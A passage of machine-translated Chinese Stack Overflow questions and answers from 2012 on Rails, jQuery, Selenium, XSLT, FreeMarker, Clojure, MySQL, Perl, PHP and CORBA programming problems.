这可能由 android-maven-plugin 实现，因为 Android 库项目具有与标准 Android 应用程序项目相似的项目结构，在开发指南中说明：

> 在结构上，库项目类似于标准的 Android 应用程序项目。例如，它在项目根目录下包含一个清单文件，以及 src/、res/ 和类似目录。该项目可以包含与标准 Android 项目相同类型的源代码和资源，以相同的方式存储。例如，库项目中的源代码可以通过其 R 类访问自己的资源。

我自己没有测试过，如果是真的，我会认为这是*android-maven-plugin*中的一个错误，因为它不尊重*project.properties*文件中`android.library=true`的设置。如果它是一个库项目，*当*您尝试使用.**`<packaging>apk</packaging>`**

# ruby-on-rails - Rails 创建操作不起作用

> ID：12429097
> 
> 赞同：0
> 
> 时间：2012-09-14T17:13:10.250
> 
> 标签：ruby-on-rails, routing

我的简单表格不是在做 POST。我一直在看这个，但看不出有什么问题（我确定它在我的路线中）。这是我所拥有的：

看法：

```
views/buyers/new.html.erb

    <%= form_for(@buyer) do |f| %>
            <%= f.text_field :phone %><br />
            <%= f.text_field :make %><br />
            <%= f.text_field :model %><br />
            <%= f.submit %>
          <% end %> 
```

控制器：

```
BuyersController
  def new
    @title = "Welcome to Car Finder"
    @buyer = Buyer.new
  end 

  def create
    @buyer = Buyer.new(params[:buyer])
    if @buyer.save!
      redirect_to success
    else
      redirect_to :back
    end
   end 
```

路线：

```
resources :buyers 
```

耙路线：

```
 buyers GET    /buyers(.:format)                buyers#index
                           POST   /buyers(.:format)                buyers#create
                 new_buyer GET    /buyers/new(.:format)            buyers#new
                edit_buyer GET    /buyers/:id/edit(.:format)       buyers#edit
                     buyer GET    /buyers/:id(.:format)            buyers#show
                           PUT    /buyers/:id(.:format)            buyers#update
                           DELETE /buyers/:id(.:format)            buyers#destroy 
```

当我提交表单时，它停留在同一页面上，永远不会进入创建操作。以下来自日志

```
Started GET "/?..[params]..."
Processing by BuyersController#new as HTML 
```

谢谢你提供的所有帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:53:02.737

重新启动服务器可能是明智之举。您的问题可能在于您在持久性级别或`buyer.rb`文件中的验证。将此添加到 _form.html.erb：

```
<% if @buyer.errors.any? %>
 <div id="error_explanation">
  <h2><%= pluralize(@buyer.errors.count, "error") %> prohibited this from being saved:   </h2>

  <ul>
  <% @buyer.errors.full_messages.each do |msg| %>
    <li><%= msg %></li>
  <% end %>
  </ul>
 </div>
<% end %> 
```

尝试再次完成请求。看看是否有任何错误被抛出。修复那些。

# jquery - jQuery通过对象数组获取两个对象之间的差异

> ID：12429098
> 
> 赞同：0
> 
> 时间：2012-09-14T17:13:13.200
> 
> 标签：jquery, object, hash, diff

把我的头发拉到这个上面，

我试图得到这样的两个对象之间的差异。它们是嵌套对象而不是数组：

```
Object a { innerA={...}, innerB={..}, innerC={...} }
Object b { innerA={...}, innerC={...} } 
```

区别应该是 innerB 对象。

我使用了 jQuery 库（1.7.2）。

我会发布代码，但我已经尝试了很多，我不知道该放什么了！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T17:24:37.483

```
var a = { innerA:{}, innerB:{}, innerC:{} };
var b = { innerA:{}, innerC:{} };

$.each(a, function(index){
    if(!b[index]) {
        // do what you want
    }
}); 
```

[演示](http://jsfiddle.net/a8Tyn/)

# selenium - System.NotImplementedException：元素不再有效-Selenium Webdriver

> ID：12429100
> 
> 赞同：2
> 
> 时间：2012-09-14T17:13:23.630
> 
> 标签：selenium, webdriver, selenium-webdriver

这让我发疯，我尝试过使用`By.Id or By.Xpath`但没有任何效果，这是我`Select Method`试图从下拉列表中选择文本

//测试代码

```
 SelectMyText(By.XPath("//*[@id='ctl00_ContentPlaceHolder1_ddlCategory']"), "Employee"); 
```

//方法：

```
 public void SelectMyText(By locator, string valueToBeSelected)
    {
        var options = GetElementId(locator).FindElements(By.TagName("option"));
        foreach (var option in options)
        {
            if (valueToBeSelected == option.Text)
            {
                option.Click();
                return;
            }
        }
    }

    public IWebElement GetElementId(By locator)
    {
        return Driver.FindElement(locator);
    } 
```

这是得到的错误：

```
threw exception: 
System.NotImplementedException: Element is no longer valid
    at OpenQA.Selenium.Remote.RemoteWebDriver.UnpackAndThrowOnError(Response errorResponse)
    at OpenQA.Selenium.Remote.RemoteWebDriver.Execute(String driverCommandToExecute, Dictionary`2 parameters)
    at OpenQA.Selenium.Remote.RemoteWebDriver.InternalExecute(String driverCommandToExecute, Dictionary`2 parameters)
    at OpenQA.Selenium.Remote.RemoteWebElement.Execute(String commandToExecute, Dictionary`2 parameters)
    at OpenQA.Selenium.Remote.RemoteWebElement.get_Text() 
```

以下是此错误的屏幕截图：

![在此处输入图像描述](../Images/5ff6f65ee3d2bf6e233dd2fd0244c9b2.png) ![在此处输入图像描述](../Images/7651b0b86a9d22be7951616558d6885f.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-19T10:58:37.517

这个想法很简单。当您怀疑元素不可访问、不可见等时，您可以使用 js 来欺骗它）所以下面我们有一些方法： -getText -clickontheelement -getelementproperty

```
public void  clickOnTheElement(String cssLocator){
JavascriptExecutor js = (JavascriptExecutor) driver;
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("var x = $(\'"+cssLocator+"\');");
        stringBuilder.append("x.click();");
        js.executeScript(stringBuilder.toString());

}

public String getTextOfTheElement(String cssLocator)
{ JavascriptExecutor js = (JavascriptExecutor) driver;
        StringBuilder stringBuilder = new StringBuilder();

stringBuilder.append("var x = $(\""+cssLocator+"\");");
        stringBuilder.append("return x.text().toString();")       ;

       String res= (String) js.executeScript(stringBuilder.toString());
       return res;
}

//getElementProperty e.g. color

public String jsGetColor(String css){

        JavascriptExecutor js = (JavascriptExecutor) driver;
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("var x=$(\'"+css+"\');");
        stringBuilder.append("return x.css('color')");
        String res= (String) js.executeScript(stringBuilder.toString());
        return res;

    }

//SO the only thing remains: you have to find css locator of the element you want to interact //with(get property, click on or get text) and pass it to appropriate function:
String myCssLocatorOfTheElement=..blablabla..;
String color=jsGetColor(myCssLocatorOfTheElement);
String text=getTextOfTheElement(myCssLocatorOfTheElement);
 clickOnTheElement(myCssLocatorOfTheElement); 
```

希望这对你有帮助）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-15T14:50:11.880

好吧，您的问题来自问题类别，如何从下拉列表中选择一个选项。我通常使用 2 种方法： **方法 1**（使用操作构建器，高级用户操作 api）：

```
WebElement mnuElement;
WebElement submnuElement;
mnEle = driver.findElement(By.Id("mnEle")).click();
sbEle = driver.findElement(By.Id("sbEle")).click();

Actions builder = new Actions(driver);
// Move cursor to the Main Menu Element
builder.MoveToElement(mnEle).perform();
// Giving 5 Secs for submenu to be displayed
Thread.sleep(5000L);
// Clicking on the Hidden SubMenu
driver.findElement(By.Id("sbEle")).click() 
```

; 你可以[在这里获得一些额外的信息](http://www.anitpatel.net/2012/02/25/selenium-webdriver-how-to-click-on-a-hidden-link-or-menu/)

**第二种方法（直接使用js）：**

```
String cssSelector =..blablabla...
JavascriptExecutor js = (JavascriptExecutor) driver;
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("var x = $(\'"+cssSelector+"\');");
        stringBuilder.append("x.click();");
        js.executeScript(stringBuilder.toString()); 
```

希望这对你有用）

# mediawiki - 在 MAMP 中安装 SMW+

> ID：12429102
> 
> 赞同：0
> 
> 时间：2012-09-14T17:13:30.233
> 
> 标签：mediawiki, mamp, semantics

我正在尝试在现有的 Semantic Mediawiki 之上在 MAMP 上安装 SMW+（安装很顺利）。

第一个问题：在[官方SMW+安装指南的第3步中](http://www.smwplus.net/index.php/Help:Installing_SMW+_1.7.0_manually_on_top_of_MediaWiki)，所见即所得编辑器没有链接，并且SMHalo扩展锁定了我的wiki。

所以，在第 6 步中，我不得不注释掉 #include_once('extensions/SMWHalo/includes/SMW_Initialize.php'); 启用S​​MWHalo(); 和 require_once("$IP/extensions/WYSIWYG/WYSIWYG.php");

我认为它在两个方面都与 SMWHalo 有关。所以，我跳到[Halo Extension 安装指南](http://smwplus.net/index.php/Help:Installing_Halo_extension_1.7.0)，它引导我找到 Wiki Admin Tool 安装指南（没有链接，因为我是菜鸟），这就是我卡住的地方。我无法让 smwadmin 成为可执行文件以挽救我的生命 chmod +x smwadmin.sh 什么也不返回，然后使用 smwadmin 给我“-bash: smwadmin: command not found”

在那里，我被困住了。注释掉这三行后，我的 wiki 仍然可以正常工作，但我显然失去了 SMW+ 功能。

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-04T21:48:09.283

只需切换到常规 SMW 并使用 Semantic Bundle 即可快速启动。恐怕 SMW+ 项目，出于所有意图和目的，现在已经死了:(

# xml - 从 xsl 转换创建多个 xml，并根据源 xml 的标记属性将数据放入这些 xml

> ID：12429103
> 
> 赞同：1
> 
> 时间：2012-09-14T17:13:29.873
> 
> 标签：xml, xslt, xpath, xslt-2.0

我正在尝试使用 xsl 2.0 根据语言名称创建不同的 xml 文件。在我的输入 xml 中，这里只有 2 种语言，“en”和“es”。

1.  所有基于“en”的人都将转到 en.xml 和
2.  所有基于“es”的人都将转到 es.xml 和
3.  所有同时拥有“en”和“es”的人都必须同时访问 en.xml 和 es.xml。

**我的输入 XML：** 源 xml 是关于人员列表、他们的地址和语言的

```
<persons>
    <person name="Alice">
        <Addresses>
            <Address type ="personal">
                <language name = "en">
                </language>
            </Address>
            <Address type ="business">
                <language name = "en">
                </language>
            </Address>
        </Addresses>
    </person>
    <person name="Bob">
        <Addresses>
            <Address type ="personal">
                <language name = "es">
                </language>
            </Address>
            <Address type ="business">
                <language name = "es">
                </language>
            </Address>
        </Addresses>
    </person>
    <person name="Stacy">
        <Addresses>
            <Address type ="personal">
                <language name = "en">
                </language>
            </Address>
            <Address type ="business">
                <language name = "es">
                </language>
            </Address>
        </Addresses>
    </person>
</persons> 
```

## **输出文件 en.xml 将具有：**

所有包含语言属性值 = "en" 的人都应该转到 en.xml 文件。在这种情况下，Alice 和 Stacy 都需要访问 en.xml

```
 <person name="Alice">
        <Addresses>
            <Address type ="personal">
                <language name = "en">
                </language>
            </Address>
            <Address type ="business">
                <language name = "en">
                </language>
            </Address>
        </Addresses>
    </person>
        <person name="Stacy">
        <Addresses>
            <Address type ="personal">
                <language name = "en">
                </language>
            </Address>
            <Address type ="business">
                <language name = "es">
                </language>
            </Address>
        </Addresses>
    </person> 
```

## **输出文件 es.xml 将具有：**

所有包含语言属性值 = "es" 的人都应该转到 en.xml 文件。在这种情况下，Bob 和 Stacy 都需要访问 es.xml

```
 <person name="Bob">
        <Addresses>
            <Address type ="personal">
                <language name = "es">
                </language>
            </Address>
            <Address type ="business">
                <language name = "es">
                </language>
            </Address>
        </Addresses>
    </person>
    <person name="Stacy">
        <Addresses>
            <Address type ="personal">
                <language name = "en">
                </language>
            </Address>
            <Address type ="business">
                <language name = "es">
                </language>
            </Address>
        </Addresses>
    </person> 
```

**到目前为止我的 XSL：**

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
  version="2.0">

<xsl:output method="xml" indent="yes" name="xml"/>

<xsl:template match="/">
    <xsl:for-each select="//persons">
       <xsl:variable name="filename"
             select="concat('allpersons/',//persons/person/Addresses/Address/language/@name,'.xml')" />
       <xsl:value-of select="$filename" />  <!-- Creating  -->
       <xsl:result-document href="{$filename}" format="xml">
             <xsl:value-of select="."/>
       </xsl:result-document>
     </xsl:for-each>
</xsl:template>
</xsl:stylesheet> 
```

解决方案不应包含“en”、“es”等属性的静态匹配。因为有很多语言。任何帮助都非常感谢？

*参考资料：* [http ://www.ibm.com/developerworks/xml/library/x-tipmultxsl/index.html](http://www.ibm.com/developerworks/xml/library/x-tipmultxsl/index.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:36:50.683

这是一个 XSLT 2.0 示例：

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:output indent="yes"/>

<xsl:template match="@* | node()">
  <xsl:copy>
    <xsl:apply-templates select="@* , node()"/>
  </xsl:copy>
</xsl:template>

<xsl:template match="persons">
  <xsl:for-each-group select="person" group-by="Addresses/Address/language/@name">
    <xsl:result-document href="{current-grouping-key()}.xml">
      <xsl:apply-templates select="current-group()"/>
    </xsl:result-document>
  </xsl:for-each-group>
</xsl:template>

<xsl:template match="person/Addresses">
  <xsl:if test="Address/language/@name = current-grouping-key()">
    <xsl:next-match/>
  </xsl:if>
</xsl:template>

</xsl:stylesheet> 
```

我不确定您是否真的想在没有根目录的情况下创建这些结果文件，但如果您想要根目录，请将`persons`模板更改为

```
<xsl:template match="persons">
  <xsl:for-each-group select="person" group-by="Addresses/Address/language/@name">
    <xsl:result-document href="{current-grouping-key()}.xml">
      <persons>
        <xsl:apply-templates select="current-group()"/>
      </persons>
    </xsl:result-document>
  </xsl:for-each-group>
</xsl:template> 
```

# classpath - 无法解析模板加载器路径 Freemarker

> ID：12429108
> 
> 赞同：1
> 
> 时间：2012-09-14T17:13:45.833
> 
> 标签：classpath, freemarker

我在 Spring 中使用 freemarker。

这是我配置 freemarker 的方式：

```
<bean id="freemarkerConfiguration" class="org.springframework.ui.freemarker.FreeMarkerConfigurationFactoryBean">     
    <property name="templateLoaderPath" value="classpath:/META-INF/templates"/>    
</bean> 
```

此配置实际上工作正常，我可以使用模板等生成报告。

但是在 Weblogic 中，我总是得到这个 Exception ：

```
15 Sep 2012 01:03:02,060 DEBUG DefaultListableBeanFactory.doCreateBean:504 - Eagerly caching bean 'freemarkerConfiguration' to allow for resolving potential circular references
15 Sep 2012 01:03:02,074 DEBUG DefaultListableBeanFactory.invokeInitMethods:1498 - Invoking afterPropertiesSet() on bean with name 'freemarkerConfiguration'
15 Sep 2012 01:03:02,228 DEBUG FreeMarkerConfigurationFactoryBean.getTemplateLoaderForPath:360 - Cannot resolve template loader path [classpath:/META-INF/templates] to [java.io.File]: using SpringTemplateLoader as fallback
java.io.FileNotFoundException: class path resource [META-INF/templates] cannot be resolved to absolute file path because it does not reside in the file system: zip:C:/Oracle/Middleware/user_projects/domains/gppuser/servers/GPPFilesBCSIS/tmp/_WL_user/GPPFilesBCSIS/phxni8/war/WEB-INF/lib/_wl_cls_gen.jar!/META-INF/templates
at org.springframework.util.ResourceUtils.getFile(ResourceUtils.java:204)
at org.springframework.core.io.AbstractFileResolvingResource.getFile(AbstractFileResolvingResource.java:52)
at org.springframework.ui.freemarker.FreeMarkerConfigurationFactory.getTemplateLoaderForPath(FreeMarkerConfigurationFactory.java:351)
at org.springframework.ui.freemarker.FreeMarkerConfigurationFactory.createConfiguration(FreeMarkerConfigurationFactory.java:304)
at org.springframework.ui.freemarker.FreeMarkerConfigurationFactoryBean.afterPropertiesSet(FreeMarkerConfigurationFactoryBean.java:60) 
```

这个错误实际上是在加载过程中发生的。任何人都知道如何解决和删除此异常？该文件实际上仍然是使用提供的模板生成的，所以我不太确定这个错误是什么。

供您参考：我没有使用爆炸部署。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-15T01:57:35.713

这没什么好担心的。请注意，日志级别是 DEBUG，而不是 ERROR 或 WARNING。

当模板目录可以通过`java.io.File`（因为它不在 a `jar`,`war`等内部）访问时，Spring 将配置 FreeMarker`java.io.File`直接使用来加载模板，因为这样 FreeMarker 可以检查最后修改时间并自动重新加载模板。为了确定路径是否可以映射到普通目录，Spring 将调用`Resource.getFile()`并查看它是否会抛出`IOException`. 如果是这样，Spring 会使用 DEBUG 级别记录，然后配置 FreeMarker 以通过 Spring 的 Resource 抽象加载模板（`Resource.getFile`当然不使用）。因此，在您的情况下，这是正常的程序流程。

# clojure - Clojure 1.4 似乎不支持没有类型提示的 amap

> ID：12429109
> 
> 赞同：3
> 
> 时间：2012-09-14T17:14:03.800
> 
> 标签：clojure

我正在[研究 Clojure 的乐趣](http://joyofclojure.com/)（我知道它是为 Clojure 1.2 编写的），并且我试图了解一些关于`amap`和相关功能的东西。

如果没有类型提示，以下代码在 Clojure 1.4 中不起作用：

```
(defn asum-sq [xs]
  (let [dbl (amap xs i ret
                 (* (aget xs i)
                    (aget xs i)))]
    (areduce dbl i ret 0.0
      (+ ret (aget dbl i))))) 
```

回复：

```
user=> (asum-sq (float-array [1 2 3 4]))
IllegalArgumentException No matching method found: aset clojure.lang.Reflector.invokeMatchingMethod (Reflector.java:80) 
```

添加了类型提示的版本有效：

```
(defn ^Double asum-sq [^floats xs]
  (let [^floats dbl (amap xs i ret
                       (* (aget xs i)
                          (aget xs i)))]
    (areduce dbl i ret 0.0
      (+ ret (aget dbl i))))) 
```

回复：

```
user=> (asum-sq (float-array [1 2 3 4]))
30.0 
```

我很难找到有关此问题的信息。究竟是什么时候引入了这一重大变化？还是我理解错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T09:46:39.357

突破性的变化是两者的通用重载都`RT/aget`被`RT/aset`删除了。

`a[gs]et`当你想要原始速度（否则你会`seq`或`vec`数组）并且缺乏适当的提示导致他们默默地采取缓慢的路径时，是否存在。

# ruby-on-rails - 在 Rails 中为 Devise 添加用户名登录而不是电子邮件的 Javascript 问题

> ID：12429110
> 
> 赞同：0
> 
> 时间：2012-09-14T17:14:06.203
> 
> 标签：ruby-on-rails, ruby-on-rails-3, devise, ruby-on-rails-3.2, usernametoken

我按照[说明为 Devise 添加了用户名登录](https://github.com/plataformatec/devise/wiki/How-To%3a-Allow-users-to-sign-in-using-their-username-or-email-address)而不是电子邮件（实际上除了电子邮件）。问题是当我实际登录时，当输入非电子邮件地址时，有一种 Javascript 机制可以使登录字段变为红色。然后，当您单击登录按钮时，会有 Javascript 阻止您登录并显示一个黑色气泡，说明“请输入电子邮件地址”。

我做错什么了吗？这些设计说明是否已过时？如何允许用户输入用户名而不是电子邮件地址来登录？我正在使用最新的设计和 Rails (v3.2.8)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:39:25.353

我认为你做错了什么。我实现了一个类似于你最近描述的登录，它工作得很好。

听起来您需要编辑设计模板。你已经生成它们了吗？如果是这样，您需要将字段类型更改为文本字段，只要您有电子邮件字段，并确保您引用的是“登录”而不是电子邮件。

该链接的“更新您的视图”部分解释了如何执行此操作。

# mysql - 如何使用 MySQL REGEXP 从邮政编码字段中删除 -XXXX？

> ID：12429117
> 
> 赞同：2
> 
> 时间：2012-09-14T17:14:48.970
> 
> 标签：mysql, sql, regex

有人可以给我一个示例，说明如何使用 SQL 命令在邮政编码字段中的破折号“-”之后删除任何内容吗？

例如，更改以下任何一项：

```
XXXXX-X
XXXXX-
XXXXX-XX
XXXXX-XXXX 
```

对此：

```
XXXXX 
```

感谢您的示例。我还需要删除数据库中的任何“-”、“-X”、“-XXXX”等实例，以便邮政编码只包含五位数字。有人可以举个例子吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T17:17:31.237

鉴于您的字段名为`zip`，那么只需执行以下操作：

```
SELECT SUBSTRING_INDEX(zip, '-', 1) as zip 
```

那会返回你想要的。

要更新表上的数据，您可以执行以下操作：

```
update table set zip = SUBSTRING_INDEX(zip, '-', 1) where condition = foo 
```

这将只更新匹配某些条件的记录，如果你想更新它们全部删除`where`部分

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:17:48.793

[`SUBSTRING_INDEX()`](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_substring-index)您可以使用 MySQL 的方法，而不是使用正则表达式：

```
SELECT SUBSTRING_INDEX(zip_code, '-', 1) FROM your_table 
```

**编辑**（以支持更新）

```
UPDATE your_table SET zip_code = SUBSTRING_INDEX(zip_code, '-', 1); 
```

我建议创建第二列，也许`zip_code_short`并运行`SET zip_code_short =`而不是覆盖主要数据 - 只是为了确保它不会首先导致任何错误（如果可行）。

# sql - 在一对多关系中返回（一个有值，其他为空）行

> ID：12429120
> 
> 赞同：1
> 
> 时间：2012-09-14T17:15:06.100
> 
> 标签：sql, join

我有两个这样的表：

```
 ---------        - -----------
    - X - Y -        - X - VALUE -
    ---------        - -----------
    -x1 - y1-        - x1- value1-     
    -x2 - y2-        - x1- value2-     
    -x3 - y3-        - x2- value3-     
    ---------        - x3- value4-
                     - x3- value5-
                     - x3- value6-
                     ------------- 
```

我想像这样加入他们：

```
 -----------------
    - X - Y - VALUE -
    -----------------
    -x1 - y1- value1-
    -   -   - value2-
    -x2 - y2- value3-
    -x3 - y3- value4-
    -   -   - value5-
    -   -   - value6-
    ----------------- 
```

我不想复制 X 值。

任何人都可以显示此查询或参考某人的示例吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:21:44.147

似乎您正试图在第一次出现后删除 X、Y 值。您可以使用 row_number() 函数对大多数数据库执行此操作。我称第一个表 XY 和第二个表 X

```
select (case when seqnum = 1 then x end) as x,
       (case when seqnum = 1 then y end) as y,
       value
from (select xy.*, x.value,
             row_number() over (partition by xy.x order by xy.value) as seqnum
      from X join
           XY
           on x.x = xy.x
order by x, y 
```

# ruby - 在独立的 Ruby gem 上运行 cron 作业的最简单方法是什么？

> ID：12429123
> 
> 赞同：0
> 
> 时间：2012-09-14T17:15:17.647
> 
> 标签：ruby, cron, gem

我有一个 gem，它打包了一个 .rb 文件，其中包含我的类和相关方法以及相应的 .bin 文件。

在本地，我可以像这样运行一切正常：

```
command_to_bin input_file output_file 
```

我不想每天手动运行它，所以我正在考虑在服务器上使用 cron，但我有点不确定如何继续。

我是否将所有内容都放入一个目录（.gem 文件、输入文件、输出文件）并将上述 cron 命令指向该目录？

我看过[这个](http://wiki.mediatemple.net/w/%28dv%29%3aRun_Ruby_on_Rails_cron_tasks)，有点明白发生了什么。我想最让我困惑的是，当我查看所有网络托管服务提供商时，他们都提到了域和应用程序，但我只想知道如何让独立脚本自行运行，而不会将其构建到网络应用程序中或关联有一个域。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:22:20.307

检查[时宝石](https://github.com/javan/whenever)。抽象出 cron 的所有讨厌的东西是一个绝妙的宝石。只需包含您在上面编写的命令，它应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-13T06:34:39.283

你不需要安装 Rails。在您`wheneverize .`的目录并在 schedule.rb 文件中设置计划之后，您需要运行`whenever --update-crontab`以将所有内容设置到系统。否则，您的 cron 作业永远不会转换为 Unix Cron

# c# - 在自定义 DateTimePickerFormat 中使用 DateTime 格式字符串

> ID：12429131
> 
> 赞同：0
> 
> 时间：2012-09-14T17:15:58.197
> 
> 标签：c#, .net, winforms, datetime, datetimepicker

在我的代码中的任何地方，在处理日期时，我都依赖[DateTime Format String "G"](http://msdn.microsoft.com/en-us/library/az4se3k1%28v=vs.110%29.aspx#GeneralDateLongTime)。除了 DateTimePicker 本身，因为我必须设置 CustomFormat，而 CustomFormat 不接受“G”作为有效的格式说明符。我需要这个，这样日期看起来都一样，不受文化影响。

关于如何规避这个问题的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:26:32.833

以下代码应该可以工作：

```
picker.CustomFormat = DateTimeFormatInfo.ShortDatePattern +  DateTimeFormatInfo.LongTimePattern 
```

这本质上就是“G”格式说明符为您提供的内容。

# regex - 如何从str中删除斜线？

> ID：12429135
> 
> 赞同：1
> 
> 时间：2012-09-14T17:16:21.447
> 
> 标签：regex, perl

如何从str中删除斜线？需要perl上的解决方案。我试过了

```
 ($phot) = $photos =~ s/\///g; 
```

但它不起作用

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-14T17:19:43.100

在 Perl 中，`s///`操作符修改你应用它的字符串；所以，你应该写：

```
my $phot = $photos;
$phot =~ s/\///g; 
```

或者，更简洁地说：

```
(my $phot = $photos) =~ s/\///g; 
```

在最新版本的 Perl 中，`/r`您可以使用一个标志来获得更像您期望的行为：

```
my $phot = ($photos =~ s/\///gr); 
```

但是你必须检查你的 Perl 版本是否有它。（您可以运行`perl -v`查看您拥有的 Perl 版本。此功能是在 Perl v5.14.0 中引入的。）

* * *

**编辑添加：**正如[amon](https://stackoverflow.com/users/1521179/amon)在评论中指出的那样，[Ωmega](https://stackoverflow.com/users/1215106/mega)在他/她的回答中暗示，`s///`操作员允许使用除`/`;以外的分隔符。因此，例如，其中任何一个都可以：

```
(my $phot = $photos) =~ s{/}{}g;
(my $phot = $photos) =~ s#/##g;
(my $phot = $photos) =~ s'/''g;        # note: prevents variable interpolation
(my $phot = $photos) =~ s-/--g; 
```

其中之一可能比写作更清楚`s/\///g`。（这取决于你。）

这种选择分隔符的自由适用于所有类似引号的运算符；例如，`"x"`也可以写成`qq{x}`or`qq/x/`或`qq-x-`。有关详细信息，请参阅[手册页](http://perldoc.perl.org/perlop.html#Quote-and-Quote-like-Operators)[中的“引用和类似引用的运算符”`perlop`](http://perldoc.perl.org/perlop.html#Quote-and-Quote-like-Operators)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:29:37.933

```
(my $phot = $photos) =~ s#/##g; 
```

或者

```
(my $phot = $photos) =~ s{/}{}g; 
```

# php - 解析 xml/json 时，如果收到错误消息则跳过页面

> ID：12429136
> 
> 赞同：0
> 
> 时间：2012-09-14T17:16:24.523
> 
> 标签：php, xml, json

我有以下问题。我正在解析具有多个页面的 xml 提要，并且无法了解它们有多少（我在 xml url 中设置了一个变量，因此对于每个变量都有随机数量的页面）。我所知道的是这个数字不能超过 50。现在我有一个脚本，可以自动增加从 1 到 50 的页码变量。

假设该链接共有 26 页。使用我的脚本，我将继续发送请求，直到脚本到达第 50 页。然后它会更改第一个变量并从 1 重新开始到 50。对于第一个链接，从第 27 页开始，xml 将返回以下内容：

```
<response>
    <status>error</status>
    <code>400</code>
    <message>Incorrect Request Headers</message>
</response> 
```

当 scipt 收到此消息时，我该如何做到这一点，以停止自动增量并通过更改第一个变量继续并从 1 重新开始？现在的代码是：

```
$query = "SELECT * FROM table_name ORDER BY id ASC";
$result = mysql_query($query) or die(mysql_error()); 
while ($row = mysql_fetch_array($result)) {
    if($row['row_name'] == '') {
        $variable1 = 0;
    }
    else {
        $variable1 = $row['row_name'];
    }

$page = 0;
    do {
        $page++;
        $result = apiCall('option1', 'option2', array('option3' => $variable1, 'page' => $page));
        usleep(1000);
        $res = json_decode($result);
            foreach ($res->node1->node2 as $item) {

            //define variable for insertion in MySQL

            $sql1 to insert the variables
            if (!mysql_query($sql1,$con1))
            {
                die('Error: ' . mysql_error());
            }
        }
    }
    while ($page<=50);
} 
```

在上面的代码中，只有`$variable1`and`$page`是变量。所有选项（1、2 和 3）都是预定义的并且保持不变。即，当脚本收到错误消息时，我需要从 1 重新开始，下一个值为`$variable1`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T19:00:08.483

好的。这是我玩过的代码：

```
$query = "SELECT * FROM table_name ORDER BY id ASC";
$result = mysql_query($query) or die(mysql_error()); 
while ($row = mysql_fetch_array($result)) {
    if($row['row_name'] == '') {
        $variable1 = 0;
    }
    else {
        $variable1 = $row['row_name'];
    }

$page = 1;
    do {
        $result = apiCall('option1', 'option2', array('option3' => $variable1, 'page' => $page));
        usleep(1000);
        $res = json_decode($result);
    if ($res->status == 'error') {
            break 2;
        }
            foreach ($res->node1->node2 as $item) {

            //define variable for insertion in MySQL

            $sql1 to insert the variables
            if (!mysql_query($sql1,$con1))
            {
                die('Error: ' . mysql_error());
            }
        }
        $page++;
    }
    while (0);
} 
```

问题是它会在某个时候停止脚本执行。无法理解为什么。

# java - 在 CORBA 客户端/服务器应用程序中将 unsigned long（来自 C++）分配给 long（Java）？

> ID：12429138
> 
> 赞同：1
> 
> 时间：2012-09-14T17:16:34.920
> 
> 标签：java, c++, type-conversion, corba

在服务器端，我有返回 unsigned long 值的函数（服务器是用 C++ 编写的），可以说：

```
class Sth {

private:
   CORBA::ULong u;
public:
   CORBA::ULong get()
   {
    return this.u;
   }

}; 
```

如何将（在客户端）从服务器返回的值分配给变量？我的意思是，Java 中没有 unsigned long ... 可以将它分配给 long 吗？像这样：

```
// corba client stuff
long var = server_obj.get(); 
```

会好吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-18T10:10:51.843

您必须查看 IDL 映射。`unsigned long`映射到`CORBA::ULong`C++ 和`int`Java 中的 OMG IDL。有关 CORBA 语言映射的更多信息，请参阅[IDL 到 Java 映射](http://docs.oracle.com/javase/1.4.2/docs/guide/idl/mapping/jidlMapping.html)和[IDL 到 C++](http://www.triodia.com/staff/michi/advanced_corba/chapter_6.pdf)映射。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:34:05.213

尝试在 java 中使用 BigInteger 类而不是 long。没有任何其他方便的方法可以进行这种转换。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T18:16:29.690

在许多情况下，您知道 unsigned long 永远不会超过 2^31，即 MAX_LONG。然后在 Java 中使用 long 是好的。

在其他一些情况下，实际值几乎没有意义，只要它们是唯一的，例如某种句柄。同样，您可以使用 jlong​​。

在其他情况下，Java 仅用作中间体，如果从 C 到 Java 到 C 的转换是正确的，那么您不必关心途中是否存在有符号/无符号不匹配。

但是如果上述例外都不成立，您应该使用 BigInteger 或重新发明它（*坏主意*）

# java - JAXB：如何将子树附加到对象并创建完整树

> ID：12429141
> 
> 赞同：5
> 
> 时间：2012-09-14T17:16:50.910
> 
> 标签：java, xml, jaxb

我有一个子树，我想将它附加到一个对象上，并使 JAXB 将所有事物编组为一棵树（并带有适当的标签）。但是目前，子树的根标签被另一个对象的标签替换

不幸的是，我不允许在这里发布原始代码，所以我在测试代码中重现了我的问题（如果你觉得这很愚蠢，请耐心等待）。

这个想法是我想输出以下结构：

```
